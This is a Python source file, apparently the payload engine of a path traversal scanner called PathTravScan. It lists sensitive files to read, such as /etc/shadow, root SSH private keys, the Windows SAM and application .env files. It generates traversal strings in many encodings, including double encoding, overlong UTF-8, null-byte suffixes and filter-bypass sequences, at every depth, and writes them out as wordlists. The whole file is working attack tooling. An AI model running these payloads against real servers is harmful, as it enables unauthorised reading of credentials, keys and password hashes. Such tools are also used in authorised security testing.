"""
PathTravScan — Payload Engine
Generates every known path traversal encoding variant.
"""
from typing import Dict, List

# ── Sensitive files to target ──────────────────────────────────────────────────
TARGET_FILES = {
    "Linux": [
        "/etc/passwd", "/etc/shadow", "/etc/hosts", "/etc/hostname",
        "/etc/os-release", "/etc/issue", "/etc/crontab",
        "/etc/apache2/apache2.conf", "/etc/nginx/nginx.conf",
        "/etc/mysql/my.cnf", "/proc/version", "/proc/self/environ",
        "/proc/self/cmdline", "/proc/net/tcp",
        "/var/log/auth.log", "/var/log/syslog",
        "/var/log/apache2/access.log", "/var/log/apache2/error.log",
        "/var/log/nginx/access.log", "/var/log/nginx/error.log",
        "/root/.bash_history", "/root/.ssh/id_rsa",
        "/root/.ssh/id_rsa.pub", "/root/.ssh/authorized_keys",
        "/var/www/html/.env", "/var/www/html/wp-config.php",
        "/var/www/html/config.php",
    ],
    "Windows": [
        "C:/Windows/System32/drivers/etc/hosts", "C:/Windows/win.ini",
        "C:/Windows/System32/config/SAM", "C:/inetpub/wwwroot/web.config",
        "C:/Users/Administrator/Desktop/flag.txt", "C:/boot.ini",
        "C:/Windows/repair/SAM", "C:/WINDOWS/system32/config/AppEvent.Evt",
    ],
    "Config/App": [
        "/app/.env", "/app/config.yml", "/app/settings.py",
        "/app/config.json", "/.env", "/.env.local", "/.env.production",
        "/config/database.yml", "/config/secrets.yml",
        "/var/www/html/config.php",
    ],
}

# ── Encoding sequences ─────────────────────────────────────────────────────────
ENCODINGS: Dict[str, str] = {
    "Basic":           "../",
    "URLenc":          "%2e%2e%2f",
    "Mixed":           "..%2f",
    "DotEnc":          "%2e%2e/",
    "UpperURL":        "%2E%2E%2F",
    "DoubleEnc":       "%252e%252e%252f",
    "Unicode1":        "..%c0%af",
    "Unicode2":        "..%c1%9c",
    "Overlong":        "%c0%ae%c0%ae/",
    "16bit":           "%u002e%u002e/",
    "Backslash":       "..%5c",
    "FilterBypass1":   "....//",
    "FilterBypass2":   "..././",
    "Semicolon":       "..;/",
}


class PayloadEngine:
    """Generates path traversal payloads at all depths and encodings."""

    # ------------------------------------------------------------------
    def quick(self, base_path: str, target_file: str) -> List[Dict]:
        """Top 15 most effective payloads — fast first pass."""
        p = base_path.rstrip("/")
        f = target_file.lstrip("/")
        raw = [
            (f"{'../' * 4}{f}",                        "Basic",       "../",         4),
            (f"{'%2e%2e%2f' * 4}{f}",                  "URLenc",      "%2e%2e%2f",   4),
            (f"{'..%2f' * 4}{f}",                       "Mixed",       "..%2f",       4),
            (f"{'%2e%2e/' * 4}{f}",                     "DotEnc",      "%2e%2e/",     4),
            (f"{'../' * 4}{f}%00.jpg",                  "NullByte",    "%00",         4),
            (f"{'%2e%2e%2f' * 6}{f}",                   "URLenc",      "%2e%2e%2f",   6),
            (f"{'..%c0%af' * 4}{f}",                    "Unicode1",    "..%c0%af",    4),
            (f"{'%252e%252e%252f' * 4}{f}",             "DoubleEnc",   "%252e%252e",  4),
            (f"{'..../' * 4}/{f}",                      "FilterBypass","....//",      4),
            (f"{'../' * 10}{f}",                        "BasicDeep",   "../",        10),
            (f"{'%2E%2E%2F' * 4}{f}",                   "UpperURL",    "%2E%2E%2F",   4),
            (f"{'..%5c' * 4}{f}",                       "Backslash",   "..%5c",       4),
            (f"{'..././' * 4}{f}",                      "FilterBypass","..././",      4),
            (f"{'%c0%ae%c0%ae/' * 4}{f}",               "Overlong",    "%c0%ae",      4),
            (f"{'%u002e%u002e/' * 4}{f}",               "16bit",       "%u002e",      4),
        ]
        return [{"payload": f"{p}/{seq}", "type": t, "encoding": e, "depth": d}
                for seq, t, e, d in raw]

    # ------------------------------------------------------------------
    def full(self, base_path: str, target_file: str,
             max_depth: int = 10) -> List[Dict]:
        """Full payload matrix — all encodings × depths + extras."""
        p = base_path.rstrip("/")
        f = target_file.lstrip("/")
        payloads: List[Dict] = []

        for enc_name, seq in ENCODINGS.items():
            for d in range(2, max_depth + 1):
                payloads.append({
                    "payload":  f"{p}/{seq * d}{f}",
                    "type":     enc_name,
                    "encoding": seq,
                    "depth":    d,
                })

        # Null-byte combos
        for d in range(2, 8):
            for ext in [".jpg", ".png", ".html", ".php"]:
                payloads.append({
                    "payload":  f"{p}/{'../' * d}{f}%00{ext}",
                    "type":     "NullByte",
                    "encoding": "%00",
                    "depth":    d,
                })

        # Absolute path attempts
        payloads.append({"payload": f"{p}/%2F{f}",   "type": "Absolute", "encoding": "%2F", "depth": 0})
        payloads.append({"payload": f"{p}///{f}",    "type": "Absolute", "encoding": "///", "depth": 0})

        return payloads

    # ------------------------------------------------------------------
    def from_wordlist(self, base_path: str, wordlist_path: str) -> List[Dict]:
        """Load raw payloads from a file, one per line."""
        p = base_path.rstrip("/")
        payloads = []
        with open(wordlist_path) as fh:
            for line in fh:
                line = line.strip()
                if line and not line.startswith("#"):
                    payloads.append({
                        "payload":  f"{p}/{line}",
                        "type":     "Wordlist",
                        "encoding": "custom",
                        "depth":    0,
                    })
        return payloads

    # ------------------------------------------------------------------
    def save_wordlist(self, payloads: List[Dict], path: str) -> None:
        """Write payload strings to a file."""
        with open(path, "w") as fh:
            for item in payloads:
                fh.write(item["payload"] + "\n")

    @staticmethod
    def targets() -> Dict[str, List[str]]:
        return TARGET_FILES
